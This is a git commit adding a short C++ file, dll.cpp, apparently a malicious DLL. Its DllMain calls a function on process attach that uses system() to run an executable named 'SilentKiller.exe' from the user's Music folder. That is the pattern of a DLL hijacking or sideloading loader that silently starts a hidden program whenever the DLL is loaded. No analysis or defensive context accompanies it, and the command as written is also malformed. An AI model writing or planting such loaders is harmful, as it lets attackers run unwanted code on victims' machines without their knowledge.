fea0ae8bc9869b10d4593537fee581f6a8e758a5
wh0am178 <167993766+wh0am178@users.noreply.github.com>
2024-05-02 14:35:27 +0000

    Add files via upload

---
+++ dll.cpp
@@ -0,0 +1,16 @@
+#include <windows.h>
+
+int result()
+{
+    system("cd %USERPROFILE%\\Music SilentKiller.exe");
+    return 0;
+}
+
+BOOL WINAPI DllMain (HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+{
+    if(fdwReason == DLL_PROCESS_ATTACH)
+    {
+        result();
+    }
+    return TRUE;
+}
